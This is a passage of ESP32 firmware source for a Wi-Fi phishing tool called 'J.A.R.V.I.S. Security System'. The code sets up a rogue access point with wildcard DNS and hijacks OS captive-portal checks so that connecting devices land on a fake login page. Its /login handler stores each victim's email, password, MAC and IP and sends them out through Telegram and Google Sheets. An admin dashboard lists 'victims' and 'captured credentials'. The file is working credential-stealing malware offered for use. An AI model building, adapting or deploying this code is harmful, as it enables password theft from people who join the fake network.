        flex: 1;
        padding: 15px;
        background: transparent;
        border: none;
        color: #bbbbbb;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
      }
      
      .tab-button:hover {
        background: rgba(50, 130, 184, 0.2);
      }
      
      .tab-button.active {
        background: var(--accent);
        color: white;
      }
      
      .tab-content {
        display: none;
        background: rgba(15, 30, 45, 0.6);
        border-radius: 16px;
        padding: 25px;
        border: 1px solid rgba(50, 130, 184, 0.2);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        margin-bottom: 20px;
      }
      
      .tab-content.active {
        display: block;
      }
      
      table {
        width: 100%;
        border-collapse: collapse;
      }
      
      th {
        background: rgba(50, 130, 184, 0.2);
        padding: 15px;
        text-align: left;
        font-weight: 600;
        color: var(--accent);
        border-bottom: 2px solid rgba(50, 130, 184, 0.3);
      }
      
      td {
        padding: 15px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.05);
      }
      
      tr:hover {
        background: rgba(50, 130, 184, 0.1);
      }
      
      .device-list {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
        gap: 15px;
      }
      
      .device-card {
        background: rgba(30, 45, 60, 0.5);
        border-radius: 12px;
        padding: 15px;
        border: 1px solid rgba(50, 130, 184, 0.2);
      }
      
      .device-card h3 {
        font-size: 18px;
        margin-bottom: 10px;
        color: var(--accent);
      }
      
      .device-card p {
        font-size: 14px;
        margin-bottom: 5px;
        color: #bbbbbb;
      }
      
      .signal {
        display: flex;
        align-items: center;
        gap: 5px;
        margin-top: 10px;
      }
      
      .signal-bar {
        width: 4px;
        height: 20px;
        background: #555;
        border-radius: 2px;
      }
      
      .signal-bar.active {
        background: var(--success);
      }
      
      .online-status {
        display: inline-block;
        width: 10px;
        height: 10px;
        border-radius: 50%;
        margin-right: 5px;
      }
      
      .online {
        background: var(--success);
      }
      
      .offline {
        background: var(--danger);
      }
      
      .serial-monitor {
        background: #1e1e1e;
        border-radius: 8px;
        padding: 15px;
        height: 400px;
        overflow-y: auto;
        font-family: monospace;
        font-size: 14px;
      }
      
      .log-entry {
        margin-bottom: 5px;
        padding: 5px;
        border-radius: 4px;
      }
      
      .log-info {
        color: #4fc3f7;
      }
      
      .log-warning {
        color: #ffb74d;
        background: rgba(255, 183, 77, 0.1);
      }
      
      .log-error {
        color: #ff5252;
        background: rgba(255, 82, 82, 0.1);
      }
      
      .log-success {
        color: #69f0ae;
        background: rgba(105, 240, 174, 0.1);
      }
      
      .config-form {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 20px;
      }
      
      .form-group {
        margin-bottom: 15px;
      }
      
      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: 600;
        color: #bbbbbb;
      }
      
      .form-group input, .form-group select {
        width: 100%;
        padding: 12px;
        background: rgba(30, 45, 60, 0.5);
        border: 1px solid rgba(50, 130, 184, 0.3);
        border-radius: 8px;
        color: white;
        font-size: 16px;
      }
      
      .toggle-switch {
        position: relative;
        display: inline-block;
        width: 60px;
        height: 34px;
      }
      
      .toggle-switch input {
        opacity: 0;
        width: 0;
        height: 0;
      }
      
      .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #555;
        transition: .4s;
        border-radius: 34px;
      }
      
      .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
      }
      
      input:checked + .slider {
        background-color: var(--accent);
      }
      
      input:checked + .slider:before {
        transform: translateX(26px);
      }
      
      .btn {
        padding: 12px 25px;
        background: linear-gradient(to right, var(--accent), var(--secondary));
        border: none;
        border-radius: 8px;
        color: white;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
      }
      
      .btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      }
      
      .btn:active {
        transform: translateY(0);
      }
      
      .footer {
        text-align: center;
        padding: 20px;
        font-size: 12px;
        color: #777;
      }
      
      @media (max-width: 768px) {
        .system-info {
          grid-template-columns: 1fr;
        }
        
        .tabs {
          flex-direction: column;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <div class="logo">
          <div class="logo-icon">J</div>
          <div class="logo-text">
            <h1>J.A.R.V.I.S. SECURITY SYSTEM</h1>
            <p>Advanced Threat Intelligence Platform</p>
          </div>
        </div>
        <div class="actions">
          <form action="/clear" method="POST" style="display: inline-block;">
            <button class="btn btn-danger" type="submit">Clear All Data</button>
          </form>
          <form action="/admin" method="GET" style="display: inline-block; margin-left: 10px;">
            <button class="btn btn-success" type="submit">Refresh</button>
          </form>
          <form action="/restart" method="POST" style="display: inline-block; margin-left: 10px;">
            <button class="btn btn-warning" type="submit">Restart System</button>
          </form>
        </div>
      </header>
      
      <div class="system-info">
        <div class="info-card">
          <h3>UPTIME</h3>
          <div class="value">)rawliteral" + getUptime() + R"rawliteral(</div>
        </div>
        <div class="info-card">
          <h3>CONNECTED DEVICES</h3>
          <div class="value">)rawliteral" + String(WiFi.softAPgetStationNum()) + R"rawliteral(</div>
        </div>
        <div class="info-card">
          <h3>TOTAL VICTIMS</h3>
          <div class="value">)rawliteral" + String(totalVictims) + R"rawliteral(</div>
        </div>
        <div class="info-card">
          <h3>SYSTEM STATUS</h3>
          <div class="value">)rawliteral" + String(adminLocked ? "LOCKED (" + lockoutRemaining + ")" : "OPERATIONAL") + R"rawliteral(</div>
        </div>
      </div>
      
      <div class="tabs">
        <button class="tab-button active" data-tab="dashboard">Dashboard</button>
        <button class="tab-button" data-tab="victims">Victims</button>
        <button class="tab-button" data-tab="devices">Devices</button>
        <button class="tab-button" data-tab="logs">Logs</button>
        <button class="tab-button" data-tab="config">Configuration</button>
      </div>
      
      <!-- Dashboard Tab -->
      <div id="dashboard" class="tab-content active">
        <div class="card-header">
          <h2>SYSTEM OVERVIEW</h2>
        </div>
        <div class="card-content">
          <p>Welcome to the J.A.R.V.I.S. Security System control panel. This dashboard provides real-time monitoring of connected devices, captured credentials, and system status.</p>
          
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
            <div>
              <h3 style="color: var(--accent); margin-bottom: 15px;">Recent Activity</h3>
              <div style="background: rgba(30, 45, 60, 0.5); border-radius: 8px; padding: 15px; height: 200px; overflow-y: auto;">
                )rawliteral";
                
                // Display last 5 serial logs
                int startIdx = serialLog.size() > 5 ? serialLog.size() - 5 : 0;
                for (int i = startIdx; i < serialLog.size(); i++) {
                  html += "<p><span style='color: #777'>[" + serialLog[i].timestamp + "]</span> " + serialLog[i].message + "</p>";
                }
                
                html += R"rawliteral(
              </div>
            </div>
            
            <div>
              <h3 style="color: var(--accent); margin-bottom: 15px;">System Actions</h3>
              <div style="display: flex; flex-direction: column; gap: 10px;">
                <button class="btn" onclick="location.reload()">Refresh Data</button>
                <button class="btn" onclick="showTab('logs')">View Full Logs</button>
                <button class="btn" onclick="showTab('config')">Configuration Settings</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Victims Tab -->
      <div id="victims" class="tab-content">
        <div class="card-header">
          <h2>CAPTURED CREDENTIALS</h2>
        </div>
        <div class="card-content">
          <table>
            <thead>
              <tr>
                <th>Time</th>
                <th>Device</th>
                <th>MAC</th>
                <th>IP</th>
                <th>Username/Email</th>
                <th>Password</th>
              </tr>
            </thead>
            <tbody>
  )rawliteral";

  for (auto &login : logins) {
    html += "<tr>";
    html += "<td>" + login.timestamp + "</td>";
    html += "<td>" + login.deviceInfo + "</td>";
    html += "<td>" + login.mac + "</td>";
    html += "<td>" + login.ip + "</td>";
    html += "<td>" + login.email + "</td>";
    html += "<td>" + login.password + "</td>";
    html += "</tr>";
  }

  html += R"rawliteral(
            </tbody>
          </table>
        </div>
      </div>
      
      <!-- Devices Tab -->
      <div id="devices" class="tab-content">
        <div class="card-header">
          <h2>CONNECTED DEVICES</h2>
        </div>
        <div class="card-content">
          <div class="device-list">
  )rawliteral";

  unsigned long currentTime = millis();
  for (auto &device : connectedDevices) {
    bool isOnline = (currentTime - device.lastSeen) < 300000;
    
    html += "<div class='device-card'>";
    html += "<h3>" + device.mac + "</h3>";
    html += "<p><span class='online-status " + String(isOnline ? "online" : "offline") + "'></span> " + 
            (isOnline ? "Online" : "Offline") + "</p>";
    html += "<p>Host: " + device.hostname + "</p>";
    html += "<p>OS: " + device.os + "</p>";
    html += "<p>IP: " + device.ip + "</p>";
    html += "<p>Status: " + String(device.authenticated ? "Authenticated" : "Not Authenticated") + "</p>";
    html += "<p>Signal: " + String(device.rssi) + " dBm</p>";
    
    html += "<div class='signal'>";
    int bars = map(device.rssi, -100, -50, 1, 5);
    for (int i = 0; i < 5; i++) {
      html += "<div class='signal-bar" + String(i < bars ? " active" : "") + "'></div>";
    }
    html += "</div>";
    
    unsigned long duration = (currentTime - device.firstSeen) / 1000;
    unsigned int hours = duration / 3600;
    unsigned int mins = (duration % 3600) / 60;
    unsigned int secs = duration % 60;
    char durationStr[20];
    snprintf(durationStr, sizeof(durationStr), "%02u:%02u:%02u", hours, mins, secs);
    
    html += "<p>Duration: " + String(durationStr) + "</p>";
    html += "</div>";
  }

  html += R"rawliteral(
          </div>
        </div>
      </div>
      
      <!-- Logs Tab -->
      <div id="logs" class="tab-content">
        <div class="card-header">
          <h2>SYSTEM LOGS</h2>
        </div>
        <div class="card-content">
          <div class="serial-monitor" id="serialMonitor">
            <!-- Logs will be inserted here by JavaScript -->
          </div>
        </div>
      </div>
      
      <!-- Configuration Tab -->
      <div id="config" class="tab-content">
        <div class="card-header">
          <h2>SYSTEM CONFIGURATION</h2>
        </div>
        <div class="card-content">
          <form action="/update-config" method="POST" class="config-form">
            <div>
              <h3 style="color: var(--accent); margin-bottom: 20px;">Wi-Fi Settings</h3>
              
              <div class="form-group">
                <label for="real_ssid">Real Wi-Fi SSID</label>
                <input type="text" id="real_ssid" name="real_ssid" placeholder=")rawliteral" + String(realSSID) + R"rawliteral(">
              </div>
              
              <div class="form-group">
                <label for="real_pass">Real Wi-Fi Password</label>
                <input type="password" id="real_pass" name="real_pass" placeholder="••••••••">
              </div>
              
              <div class="form-group">
                <label for="rogue_ssid">Rogue AP SSID</label>
                <input type="text" id="rogue_ssid" name="rogue_ssid" placeholder=")rawliteral" + String(rogueSSID) + R"rawliteral(">
              </div>
            </div>
            
            <div>
              <h3 style="color: var(--accent); margin-bottom: 20px;">Notification Settings</h3>
              
              <div class="form-group">
                <label for="telegram_chat">Telegram Chat ID</label>
                <input type="text" id="telegram_chat" name="telegram_chat" placeholder=")rawliteral" + String(telegramChatID) + R"rawliteral(">
              </div>
              
              <div class="form-group">
                <label>Features</label>
                <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 10px;">
                  <div style="display: flex; align-items: center; justify-content: space-between;">
                    <span>Internet Access</span>
                    <label class="toggle-switch">
                      <input type="checkbox" name="internet" )rawliteral" + (tempInternetEnabled ? "checked" : "") + R"rawliteral(>
                      <span class="slider"></span>
                    </label>
                  </div>
                  
                  <div style="display: flex; align-items: center; justify-content: space-between;">
                    <span>Telegram Notifications</span>
                    <label class="toggle-switch">
                      <input type="checkbox" name="telegram" )rawliteral" + (ENABLE_TELEGRAM ? "checked" : "") + R"rawliteral(>
                      <span class="slider"></span>
                    </label>
                  </div>
                  
                  <div style="display: flex; align-items: center; justify-content: space-between;">
                    <span>Google Sheets</span>
                    <label class="toggle-switch">
                      <input type="checkbox" name="sheets" )rawliteral" + (ENABLE_GOOGLE_SHEETS ? "checked" : "") + R"rawliteral(>
                      <span class="slider"></span>
                    </label>
                  </div>
                </div>
              </div>
              
              <div style="display: flex; gap: 10px; margin-top: 30px;">
                <button type="submit" class="btn">Update Configuration</button>
                <button type="button" class="btn" onclick="resetConfig()">Reset to Default</button>
              </div>
            </div>
          </form>
        </div>
      </div>
      
      <div class="footer">
        J.A.R.V.I.S. Security System v6.0 | 
        Developed by Javed Hussain | 
        Advanced Threat Intelligence Platform
      </div>
    </div>
    
    <script>
      // Tab switching function
      function showTab(tabName) {
        // Hide all tab contents
        const tabs = document.querySelectorAll('.tab-content');
        tabs.forEach(tab => tab.classList.remove('active'));
        
        // Remove active class from all buttons
        const buttons = document.querySelectorAll('.tab-button');
        buttons.forEach(btn => btn.classList.remove('active'));
        
        // Show the selected tab
        document.getElementById(tabName).classList.add('active');
        
        // CORRECT:
        document.querySelector(`.tab-button[data-tab="${tabName}"]`).classList.add('active');
      }
      
      // Add event listeners to tab buttons
      document.addEventListener('DOMContentLoaded', function() {
        const tabButtons = document.querySelectorAll('.tab-button');
        tabButtons.forEach(button => {
          button.addEventListener('click', function() {
            const tabName = this.getAttribute('data-tab');
            showTab(tabName);
          });
        });
      });
      
      // WebSocket for logs
      const socket = new WebSocket('ws://' + window.location.host + '/ws');
      const serialMonitor = document.getElementById('serialMonitor');
      
      socket.onmessage = function(event) {
        const log = JSON.parse(event.data);
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry log-' + log.type;
        logEntry.innerHTML = '<span style="color: #777">[' + log.timestamp + ']</span> ' + log.message;
        serialMonitor.appendChild(logEntry);
        serialMonitor.scrollTop = serialMonitor.scrollHeight;
      };
      
      // Load initial logs
      window.onload = function() {
        fetch('/get-logs')
          .then(response => response.json())
          .then(logs => {
            logs.forEach(log => {
              const logEntry = document.createElement('div');
              logEntry.className = 'log-entry log-' + log.type;
              logEntry.innerHTML = '<span style="color: #777">[' + log.timestamp + ']</span> ' + log.message;
              serialMonitor.appendChild(logEntry);
            });
            serialMonitor.scrollTop = serialMonitor.scrollHeight;
          });
      };
      
      // Reset config function
      function resetConfig() {
        document.getElementById('real_ssid').value = '';
        document.getElementById('real_pass').value = '';
        document.getElementById('rogue_ssid').value = '';
        document.getElementById('telegram_chat').value = '';
        document.querySelector('input[name="internet"]').checked = true;
        document.querySelector('input[name="telegram"]').checked = true;
        document.querySelector('input[name="sheets"]').checked = true;
      }
    </script>
  </body>
  </html>
)rawliteral";
return html;
}

// =====================
// SETUP FUNCTION
// =====================
void setup() {
  esp_task_wdt_init(WDT_TIMEOUT, false);
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n\n");
  delay(50);
  Serial.println("   ██╗ █████╗ ██████╗ ██╗   ██╗ █████╗ ███████╗");
  delay(50);
  Serial.println("   ██║██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝");
  delay(50);
  Serial.println("   ██║███████║██████╔╝██║   ██║███████║███████╗");
  delay(50);
  Serial.println("██╗██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══██║╚════██║");
  delay(50);
  Serial.println("╚█████╔╝██║  ██║██║  ██║ ╚████╔╝ ██║  ██║███████║");
  delay(50);
  Serial.println(" ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝");
  delay(50);
  Serial.println("\n[JARVIS INITIALIZING...]");
  Serial.println("> Booting sequence started");
  Serial.println("> Loading core modules");
  Serial.println("> Starting security protocols");
  
  addSerialLog("System initialization started", "info");
  
  Serial.println("\n> Connecting to Real Wi-Fi: " + String(realSSID));
  WiFi.mode(WIFI_AP_STA);
  WiFi.begin(realSSID, realPassword);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
    esp_task_wdt_reset();
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n> Real Wi-Fi Connected ✅");
    Serial.println("> IP Address: " + WiFi.localIP().toString());
    addSerialLog("Connected to real WiFi: " + String(realSSID), "success");
  } else {
    Serial.println("\n> ❌ Failed to connect to Real Wi-Fi");
    addSerialLog("Failed to connect to real WiFi", "error");
  }

  Serial.println("\n> Creating Rogue Access Point...");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  if (WiFi.softAP(rogueSSID, roguePassword)) {
    Serial.println("✅ Rogue AP Created: " + String(rogueSSID));
    Serial.println("> Rogue AP IP: " + WiFi.softAPIP().toString());
    addSerialLog("Rogue AP created: " + String(rogueSSID), "success");
  } else {
    Serial.println("❌ Failed to start Rogue AP");
    addSerialLog("Failed to create Rogue AP", "error");
  }

  dnsServer.start(DNS_PORT, "*", apIP);
  startTime = millis();

  ws.onEvent(onWebSocketEvent);
  server.addHandler(&ws);

  // =====================
  // SERVER ROUTES
  // =====================
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });
  
  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->send_P(200, "text/html", loginPage);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    trackDevice(request);
    
    if (request->hasParam("email", true) && request->hasParam("pass", true)) {
      String email = request->getParam("email", true)->value();
      String pass = request->getParam("pass", true)->value();
      String deviceInfo = getDeviceInfo(request);
      String timestamp = getCurrentTime();
      
      IPAddress remoteIP = request->client()->remoteIP();
      String ipStr = remoteIP.toString();
      String mac = "Unknown";
      
      wifi_sta_list_t wifi_sta_list;
      tcpip_adapter_sta_list_t adapter_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

      if (esp_wifi_ap_get_sta_list(&wifi_sta_list) == ESP_OK) {
          if (tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list) == ESP_OK) {
              for (int i = 0; i < adapter_sta_list.num; i++) {
                  tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
                  if (IPAddress(station.ip.addr) == remoteIP) {
                      mac = formatMacAddress(station.mac);
                      authenticateDevice(mac);
                      break;
                  }
              }
          }
      }
      
      if (logins.size() < MAX_LOGINS) {
        logins.push_back({email, pass, timestamp, deviceInfo, mac, ipStr});
      }
      
      printToSerial(email, pass, deviceInfo);
      
      if (ENABLE_GOOGLE_SHEETS) {
        sendToGoogleSheets(email, pass, deviceInfo, mac, ipStr);
      }
      
      if (ENABLE_TELEGRAM) {
        String message = "🚨 NEW CREDENTIALS CAPTURED 🚨\n";
        message += "⏰ Time: " + timestamp + "\n";
        message += "📱 Device: " + deviceInfo + "\n";
        message += "📶 MAC: " + mac + "\n";
        message += "📍 IP: " + ipStr + "\n";
        message += "📧 Username/Email: " + email + "\n";
        message += "🔑 Password: " + pass + "\n";
        message += "🌐 Total Victims: " + String(totalVictims);
        
        sendTelegramMessage(message);
      }
    }
    
    request->redirect("http://instagram.com");
  });

  if (ENABLE_ADMIN_PANEL) {
    server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
      trackDevice(request);
      
      if (adminLocked) {
        unsigned long currentTime = millis();
        if (currentTime - lockoutStart >= LOCKOUT_TIME) {
          adminLocked = false;
          failedAdminAttempts = 0;
          lockoutRemaining = "";
          addSerialLog("Admin lockout period expired", "info");
        } else {
          unsigned long remaining = LOCKOUT_TIME - (currentTime - lockoutStart);
          unsigned long remainingSeconds = remaining / 1000;
          unsigned int minutes = remainingSeconds / 60;
          unsigned int seconds = remainingSeconds % 60;
          char timeStr[10];
          snprintf(timeStr, sizeof(timeStr), "%02u:%02u", minutes, seconds);
          
          String html = String(adminLoginPage);
          html.replace("%ERROR_MESSAGE%", "<div class='error-message'>⚠ System Locked: Too many failed attempts. Try again in " + String(timeStr) + "</div>");
          request->send(200, "text/html", html);
          return;
        }
      }
      
      // If not locked, show the login page
      String html = String(adminLoginPage);
      html.replace("%ERROR_MESSAGE%", "");
      request->send(200, "text/html", html);
    });
  
    server.on("/admin-verify", HTTP_POST, [](AsyncWebServerRequest *request) {
      trackDevice(request);
      
      String ip = request->client()->remoteIP().toString();
      String mac = "Unknown";
      String userAgent = request->getHeader("User-Agent")->value();
      
      wifi_sta_list_t wifi_sta_list;
      tcpip_adapter_sta_list_t adapter_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));

      if (esp_wifi_ap_get_sta_list(&wifi_sta_list) == ESP_OK) {
          if (tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list) == ESP_OK) {
              for (int i = 0; i < adapter_sta_list.num; i++) {
                  tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
                  if (IPAddress(station.ip.addr) == request->client()->remoteIP()) {
                      mac = formatMacAddress(station.mac);
                      break;
                  }
              }
          }
      }
      
      if (request->hasParam("pin", true)) {
        String pin = request->getParam("pin", true)->value();
        bool success = (pin == adminPin);
        
        adminAttempts.push_back({ip, mac, getCurrentTime(), success, userAgent});
        if (adminAttempts.size() > 20) {
          adminAttempts.erase(adminAttempts.begin());
        }
        
        if (success) {
          failedAdminAttempts = 0;
          adminLocked = false;
          lockoutRemaining = "";
          
          if (ENABLE_TELEGRAM) {
            String message = "🔓 Admin Login Successful\n";
            message += "⏰ Time: " + getCurrentTime() + "\n";
            message += "📶 MAC: " + mac + "\n";
            message += "🖥 OS: " + getDeviceOS(userAgent) + "\n";
            message += "🌐 IP: " + ip;
            
            sendTelegramMessage(message);
          }
          
          request->send(200, "text/html", buildAdminPage());
        } else {
          failedAdminAttempts++;
          lastAdminAttempt = millis();
          
          if (ENABLE_TELEGRAM) {
            String message = "⚠ Admin Login Failed\n";
            message += "⏰ Time: " + getCurrentTime() + "\n";
            message += "📶 MAC: " + mac + "\n";
            message += "🖥 OS: " + getDeviceOS(userAgent) + "\n";
            message += "🌐 IP: " + ip + "\n";
            message += "🔢 Attempts: " + String(failedAdminAttempts);
            
            sendTelegramMessage(message);
          }
          
          if (failedAdminAttempts >= MAX_ADMIN_ATTEMPTS) {
            adminLocked = true;
            lockoutStart = millis();
            addSerialLog("Admin panel locked due to too many failed attempts", "error");
            
            if (ENABLE_TELEGRAM) {
              String message = "🔒 Admin Panel Locked\n";
              message += "⏰ Time: " + getCurrentTime() + "\n";
              message += "📶 MAC: " + mac + "\n";
              message += "🖥 OS: " + getDeviceOS(userAgent) + "\n";
              message += "🌐 IP: " + ip + "\n";
              message += "⏳ Lockout Duration: 5 minutes";
              sendTelegramMessage(message);
            }
          }
          
          String html = String(adminLoginPage);
          html.replace("%ERROR_MESSAGE%", "<div class='error-message'>⚠ Access Denied: Invalid Security PIN</div>");
          request->send(200, "text/html", html);
        }
      } else {
        request->redirect("/admin");
      }
    });
  
    server.on("/clear", HTTP_POST, [](AsyncWebServerRequest *request) {
      trackDevice(request);
      logins.clear();
      request->send(200, "text/html", buildAdminPage());
      addSerialLog("All captured credentials cleared", "warning");
    });
    
    server.on("/restart", HTTP_POST, [](AsyncWebServerRequest *request) {
      request->send(200, "text/plain", "System restarting...");
      addSerialLog("System restart initiated by admin", "warning");
      delay(1000);
      ESP.restart();
    });
    
    server.on("/get-logs", HTTP_GET, [](AsyncWebServerRequest *request) {
      String json;
      StaticJsonDocument<1024> doc;
      JsonArray logs = doc.to<JsonArray>();
      
      for (const auto &log : serialLog) {
        JsonObject logEntry = logs.createNestedObject();
        logEntry["message"] = log.message;
        logEntry["timestamp"] = log.timestamp;
        logEntry["type"] = log.type;
      }
      
      serializeJson(doc, json);
      request->send(200, "application/json", json);
    });
    
    server.on("/update-config", HTTP_POST, [](AsyncWebServerRequest *request) {
      if (request->hasParam("real_ssid", true)) {
        tempRealSSID = request->getParam("real_ssid", true)->value();
      }
      if (request->hasParam("real_pass", true)) {
        tempRealPassword = request->getParam("real_pass", true)->value();
      }
      if (request->hasParam("rogue_ssid", true)) {
        tempRogueSSID = request->getParam("rogue_ssid", true)->value();
      }
      if (request->hasParam("telegram_chat", true)) {
        tempTelegramChatID = request->getParam("telegram_chat", true)->value();
      }
      if (request->hasParam("internet", true)) {
        tempInternetEnabled = request->getParam("internet", true)->value() == "on";
      }
      
      request->send(200, "text/html", buildAdminPage());
      addSerialLog("Configuration updated", "info");
    });
  }

  server.onNotFound([](AsyncWebServerRequest *request) {
    trackDevice(request);
    request->redirect("/");
  });

  server.begin();

  Serial.println("\n> Web Server Started ✅");
  Serial.println("> DNS Server Started ✅");
  Serial.println("> Captive Portal Activated ✅");

  Serial.println("\n[JARVIS STATUS: OPERATIONAL]");
  Serial.println("> Awaiting connections...");

  Serial.println("\n╔══════════════════════════════════════════════════╗");
  Serial.println("║      J.A.R.V.I.S. WiFi Portal System v6.0       ║");
  Serial.println("║           Developed by Javed Hussain            ║");
  Serial.println("║ github.com/jvdhussain026/JARVIS-Captive-Portal ║");
  Serial.println("╚══════════════════════════════════════════════════╝");

  Serial.println("\n╔══════════════════════════════════════════════════╗");
  Serial.println("║               SYSTEM READY                       ║");
  Serial.println("╠══════════════════════════════════════════════════╣");
  Serial.printf("║ SSID:    %-35s ║\n", rogueSSID);
  Serial.printf("║ IP:      %-35s ║\n", WiFi.softAPIP().toString().c_str());
  Serial.printf("║ Uptime:  %-35s ║\n", getUptime().c_str());
  Serial.println("╚══════════════════════════════════════════════════╝");
  
  addSerialLog("System initialization complete", "success");
}

// =====================
// MAIN LOOP
// =====================
void loop() {
  dnsServer.processNextRequest();
  ws.cleanupClients();
  
  static unsigned long lastCleanup = 0;
  if (millis() - lastCleanup > 60000) {
    unsigned long currentTime = millis();
    for (int i = connectedDevices.size() - 1; i >= 0; i--) {
      if (currentTime - connectedDevices[i].lastSeen > 300000) {
        addSerialLog("Device disconnected: " + connectedDevices[i].mac + " (" + connectedDevices[i].os + ")", "info");
        connectedDevices.erase(connectedDevices.begin() + i);
      }
    }
    lastCleanup = millis();
  }
  
  // Admin lockout handling
  if (adminLocked) {
    unsigned long currentTime = millis();
    if (currentTime - lockoutStart >= LOCKOUT_TIME) {
      adminLocked = false;
      failedAdminAttempts = 0;
      lockoutRemaining = "";
      addSerialLog("Admin lockout period expired", "info");
      
      if (ENABLE_TELEGRAM) {
        String message = "🔓 Admin Panel Unlocked\n";
        message += "⏰ Time: " + getCurrentTime() + "\n";
        message += "✅ Lockout period has ended";
        sendTelegramMessage(message);
      }
    } else {
      // Calculate remaining lockout time
      unsigned long remaining = LOCKOUT_TIME - (currentTime - lockoutStart);
      unsigned long remainingSeconds = remaining / 1000;
      unsigned int minutes = remainingSeconds / 60;
      unsigned int seconds = remainingSeconds % 60;
      char timeStr[10];
      snprintf(timeStr, sizeof(timeStr), "%02u:%02u", minutes, seconds);
      lockoutRemaining = String(timeStr);
    }
  }
  
  static unsigned long lastActivity = 0;
  if (millis() - lastActivity > 30000) {
    if (WiFi.softAPgetStationNum() > 0) {
      addSerialLog("System active | Devices: " + String(WiFi.softAPgetStationNum()) + 
                  " | Uptime: " + getUptime(), "info");
    }
    lastActivity = millis();
  }
  
  esp_task_wdt_reset();
  delay(10);
}

